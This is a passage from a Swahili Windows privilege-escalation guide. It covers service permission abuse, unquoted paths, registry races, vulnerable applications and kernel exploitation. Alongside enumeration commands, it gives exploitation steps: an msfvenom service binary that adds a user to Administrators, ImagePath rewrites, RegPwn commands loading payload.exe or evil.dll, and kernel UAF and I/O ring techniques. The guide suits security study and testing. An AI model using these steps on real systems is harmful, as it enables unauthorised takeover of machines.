- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa ajili ya kugundua na kutumia udhaifu huu, unaweza kutumia _exploit/windows/local/service_permissions_.

### Ruhusa dhaifu za service binaries

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye upendeleo, lakini **watumiaji wenye upendeleo mdogo wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa kwa **kubadilisha binary na kuanzisha upya service**.

**Angalia ikiwa unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ambamo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata binaries zote zinazoendeshwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizokabidhiwa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au kwenye directory iliyo nayo. Mtiririko wa vitendo wa kutumia udhaifu huu ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na path ya executable kwa `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa `icacls <path>`.
3. Badilisha binary ya service kwa payload au binary halali ya service yenye nia ovu.
4. Anzisha upya service kwa `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa mfumo / kichochezi cha service).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuianzisha upya, angalia ikiwa inaanza yenyewe wakati wa kuwasha mfumo, ina hatua ya kushughulikia hitilafu inayoiwasha tena, au inaweza kuwashwa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha registry ya huduma

Unapaswa kuangalia ikiwa unaweza kurekebisha registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Jaribio la ruhusa la awali lilielezwa hivi:

Inapaswa kukaguliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na huduma inaweza kubadilishwa.

Kagua ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha uandishi kwenye ufunguo maalum wa huduma. Ingizo la ACL pekee halithibitishi ufikiaji halisi: ingizo za deny, token ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za ufunguo wa registry ni tofauti na haki za objekti ya huduma za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji sehemu ya usanidi wa huduma inayoweza kutumiwa, njia ya kuanzisha huduma, na utambulisho wa huduma wenye marupurupu ya juu zaidi. Tazama [haki za ufunguo wa registry za Microsoft](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [marejeleo ya haki za ufikiaji wa huduma](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ya kuandika thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** za kila mtumiaji ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** hadi kwenye ufunguo wa session wa HKLM. **Symbolic link race** ya registry inaweza kuelekeza uandishi huo wenye upendeleo hadi kwenye **path yoyote ya HKLM**, na kutoa primitive ya kuandika **thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop, na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha kunakili kwa secure-desktop (kwa mfano, **LockWorkstation**), kunakoanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapowashwa, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye target ya HKLM iliyolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambulizi kwenye path ya HKLM iliyoelekezwa.

Baada ya kupata uwezo wa kuandika thamani yoyote ya HKLM, tumia hilo kupata LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya kuandika. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye registry, **unaweza kuunda sub registries kutoka kwenye registry hii**. Kwa huduma za Windows, hii **inatosha kutekeleza msimbo wowote**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu ya path inayoishia kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha unquoted service paths zote, ukiondoa zile zinazohusu huduma zilizojengewa ndani ya Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na ku-exploit udhaifu huu kwa metasploit:** `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya service mwenyewe kwa metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Hatua za Urejeshaji

Windows huruhusu watumiaji kubainisha hatua zitakazochukuliwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, privilege escalation inaweza kuwezekana. Maelezo zaidi yanapatikana kwenye [hati rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Script targets za scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **action arguments** na pia `cmd.exe`. Hili pia linatumika kwa argument ya faili iliyobainishwa wazi kwa interpreter, kama vile PowerShell `-File`. Ikiwa batch file ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; variables, conditionals na shell chaining zinahitaji kufuatiliwa kwa mikono. Script au parent directory inayoweza kuandikwa na caller inaweza kuwa kiashiria cha utekelezaji kati ya akaunti tofauti tu ikiwa task principal iliyosanidiwa ni tofauti na caller na task inafikia action hiyo. ACL ya append-only inaweza kuwa muhimu kwa scripts, lakini `exit` ya mapema au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger na application-control policy kabla ya kudai kuwa privilege escalation inawezekana. Inventory haipaswi kurekebisha script wala kuanzisha task.

## Named streams kwenye faili zinazofikika

Kwenye NTFS, faili inayoweza kusomwa inaweza kuwa na stream ya `:$DATA` yenye jina, ambayo maudhui yake hayaonyeshwi kwenye uorodheshaji wa kawaida wa directory. Kwa seti ndogo na husika ya backup au configuration files zinazofikika, kagua majina na **ukubwa** wa stream kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwepo kwa secret ni kiashiria tu. Kagua ruhusa halisi za kusoma za faili, usaidizi wa filesystem kwa streams, kama stream ina credentials zinazoweza kutumika, na akaunti ambayo credentials hizo huithibitisha kwa kweli. Epuka ukaguzi wa recursive wa streams na kuchapisha maudhui ya stream wakati wa uorodheshaji wa kawaida.

## Scheduled Windows Driver Kit helper inputs

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf` na project `working\rsf.rsf` kutoka kwenye run directory yake. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye privileged inaweza kutumia ruhusa za kuandika za kiwango cha chini kwenye inputs hizo kutekeleza amri katika context ya akaunti hiyo, hata kama executable ya helper yenyewe imelindwa. Thibitisha kuwa kuna consumer mwenye privileged na kwamba **faili zote mbili** za sidecar zinaweza kuundwa au kurekebishwa; kugundua helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia mbili za sidecar. Ikiwa task haibainishi working directory, directory ya executable ni kiashiria cha kuthibitisha, si ushahidi wa mahali task inaposoma inputs zake. Sharti la project working-file lazima pia litimizwe. Kagua task principal halisi badala ya kudhani inaendeshwa kama SYSTEM.

## Applications

### Applications Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda unaweza kubadilisha moja na kupata privilege escalation) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya ukarabati wa Checkmk Windows agent

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri Checkmk Windows agents za zamani ambazo ziliandika faili za amri katika `C:\Windows\Temp` kisha kutekeleza faili iliyokuwepo awali na iliyolindwa dhidi ya kuandikwa wakati ubadilishaji uliposhindwa. Vendor alirekebisha tatizo hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na ikiwa utendaji wa agent ulioathirika unaweza kuendeshwa; lebo ya tawi pekee kama `2.1` haiwezi kuthibitisha kuathirika. Uhesabuji unaweza kukagua toleo, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha amri za agent.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na matoleo ya awali; vendor aliirekebisha katika build 6211. Inahusika tu ikiwa SAML SSO **imewashwa au iliwahi kuwashwa**. Kwa hiyo, rekodi ya bidhaa iliyosakinishwa au njia ya service ni kidokezo tu, si uamuzi wa kuwa na athari: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoendesha service. Code execution kupitia service hurithi ruhusa za akaunti hiyo; utekelezaji wa SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. `OfflineBackup_*.ezip` inayosomeka katika saraka ya Backup ya bidhaa ni kidokezo tofauti cha backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa uhesabuji wa kawaida.

#### Mipaka ya Jenkins controller na akaunti za domain

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuiwasha: [Jenkins inaeleza kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Uwepo wake pekee hauonyeshi password; thibitisha **ruhusa ya kusoma faili zinazohitajika** na njia tofauti ya kutumia tena akaunti bila kuchapisha siri katika matokeo yanayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha kuwa script path inaweza kuandikwa na kuna logon halisi au consumer iliyopangwa inayotumia akaunti ya mtumiaji lengwa kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi kupitia group unahitaji uthibitishaji tofauti wa ruhusa za AD zinazotumika.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuipanga kwenye foleni** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye ruhusa za chini inaweza kuwasilisha script step na kuendesha pipeline hiyo kwenye Windows agent inayojisimamia, step hiyo hutekelezwa kama [akaunti ya mfumo wa uendeshaji iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa agent service kabla ya kudai kuwa kuna mpito kati ya watumiaji au hadi SYSTEM. Agent iliyosakinishwa, role ya mradi, au ruhusa ya kuandika repository pekee ni kidokezo tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa uhesabuji wa bila kuingilia.

#### Credential za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosaniwa. Credential za connector huhifadhiwa zikiwa zimesimbwa kwa njia fiche katika database hiyo, huku key material [ikilindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group yenye jina linalodokeza kuwa ni la local administrator, au uwezo wa kuona database pekee havithibitishi credential inayoweza kufumbuliwa au kupandishwa kwa ruhusa za domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na ruhusa halisi za AD za utambulisho huo. Uhesabuji wa kawaida unapaswa kuonyesha metadata ya service na ufikiaji pekee, bila kuuliza au kuchapisha siri zilizohifadhiwa.

#### Ruhusa za support DLL za printer driver

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzipakia katika print process yenye ruhusa za juu zaidi. Kagua saraka halisi ya driver na ACL za DLL, pamoja na saraka za wazazi na reparse points, hata kama uhesabuji wa printer WMI umekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu kuandika ni kidokezo tu: thibitisha ruhusa halisi ya kuandika baada ya kuzingatia deny entries, kwamba driver husika imesakinishwa na inapakia faili hiyo kwa utambulisho wenye ruhusa za juu, na ikiwa driver iliyosasishwa na vendor au programu ya usalama imerekebisha usakinishaji. Usikisie kuwa kuna athari kutokana na jina la saraka au toleo la driver pekee.

### Ruhusa za Kuandika

Angalia ikiwa unaweza kurekebisha faili fulani ya usanidi ili kusoma faili maalum, au ikiwa unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia moja ya kupata ruhusa dhaifu za folda/faili kwenye mfumo ni kufanya yafuatayo:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya folda zake za `plugins`. Ikiwa kuna usakinishaji wa portable/nakala unaoweza kuandikwa, kuweka plugin hasidi husababisha utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila inapowashwa (ikiwemo kupitia `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Kuendesha wakati wa kuwasha

**Angalia kama unaweza kubadilisha registry au binary itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili upate maelezo zaidi kuhusu **maeneo ya autoruns yanayovutia kwa kupandisha marupurupu**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazoweza kuwa za **watu wengine, zisizo za kawaida/zilizo hatarishi**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inatoa primitive ya kusoma/kuandika kernel kwenye anwani yoyote (jambo la kawaida katika IOCTL handlers zilizobuniwa vibaya), unaweza kupandisha privileges kwa kuiba SYSTEM token moja kwa moja kutoka kwenye memory ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Nyenzo zinazohusiana na Windows kernel-exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa race-condition bugs ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, kuchelewesha kimakusudi lookup (kwa kutumia components zenye urefu wa juu zaidi au minyororo mirefu ya directories) kunaweza kuongeza muda wa fursa kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAFs, ufichuzi wa paged-pool, na I/O ring pivots

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kwa kutumia bugs mbili dhaifu kivyake: **race ya muda wa maisha ya cancel-safe queue** inayofungua request/CBD huku lock ya queue ikiwa bado imefungwa, na ufichuzi wa **lock-release-before-copy** unaovujisha allocation ya paged-pool iliyofunguliwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na exploitation:

- **Kufungua chini ya lock + cancel baadaye**: tafuta njia ya mafanikio inayofanya **Acquire -> CompleteRequest/free -> Release**, huku njia ya cancel ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kufungua lock ya CBDQ/CSQ, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofunguliwa kwa callback ya remove ya driver.
- **Tumia allocation ya paged-pool ya ukubwa sawa inayodhibitiwa na mshambuliaji** kuchukua nafasi ya queue object iliyofunguliwa. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na baadaye unaweza kuzichunguza kwa pipe read/peek operations. Ikiwa object iliyofunguliwa ina list links, zibadilishe ziwe **mzunguko wa fake request nodes kwenye user memory** ili driver iendelee kuchakata request structures zilizobainishwa na mshambuliaji badala ya kusimama kwenye kichwa cha list cha awali.
- **Boresha write inayotabirika**: ikiwa fake request inaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata kernel write inayodhibiti anwani lakini si thamani. Katika hali hiyo, lenga sehemu ya **length/size** ya sprayed pool object badala ya code/data pointer ya mwisho, kisha pitia spray hadi object iliyoharibika iweze kutoa **out-of-bounds paged-pool read**.
- **Muundo wa raceable disclosure**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka pale mshambuliaji anapoweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano, kwa kuongeza list/resource entries nyingi zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi huongeza muda wa kuchukua nafasi bila kusababisha mashine ku-crash.
- **Malengo ya refill yenye pointers nyingi**: arrays za registered-buffer za Windows **I/O ring** ni malengo bora ya disclosure kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na mshambuliaji (`8 * regBufferCnt`) na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Leak mojawapo ya arrays hizi, pata `IORING_OBJECT` iliyo karibu, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili shughuli zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa kernel read/write ya anwani yoyote. Ikiwa write pekee inayopatikana inakupa byte isiyobadilika (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kuunda user pointer yenye byte inayojirudia kama `0x0101010101010101`, imap kwa `VirtualAlloc`, na uweke forged registered-buffer array hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Mara tu upate usomaji/uandishi holela wa kernel kutoka kwenye I/O ring iliyoharibika, iba token ya SYSTEM kwa kutumia workflow ya kawaida ya post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za uharibifu wa kumbukumbu za registry hive

Vulnerabilities za kisasa za hive hukuruhusu kupanga layouts zinazotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikika, na kubadilisha uharibifu wa metadata kuwa overflows za kernel paged-pool bila custom driver. Jifunze chain nzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Mkanganyiko wa aina katika direct-mode ya `RtlQueryRegistryValues` unaotokana na paths zinazodhibitiwa na attacker

Baadhi ya drivers hukubali registry path kutoka userland, hukagua tu kwamba ni string halali ya UTF-16, kisha kuita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa `RTL_QUERY_REGISTRY_DIRECT` ndani ya scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hufasiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii hutengeneza primitives mbili muhimu:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path ya absolute `\Registry\...` inayodhibitiwa na mtumiaji huruhusu driver kuuliza keys zilizochaguliwa na attacker, kufichua uwepo wake kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kuzifikia moja kwa moja.
- **Uharibifu wa kumbukumbu ya kernel**: destination ya scalar kama `&readValue` huchanganywa kimakosa na aina ya `REG_QWORD`, `UNICODE_STRING`, au sized binary buffer kulingana na aina ya registry value.

Vidokezo vya vitendo vya exploitation:

- **Mitigation ya Windows 8+**: ikiwa query itafikia **untrusted hive** yenye `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability ibaki, tafuta **keys zinazoweza kuandikika na attacker ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Kuweka values kwenye trusted hive**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikika za `\Registry\Machine`, kisha rudia scan kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazoweza kufikiwa kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza kufuta kwa sehemu pointer ya callback/function iliyo karibu.
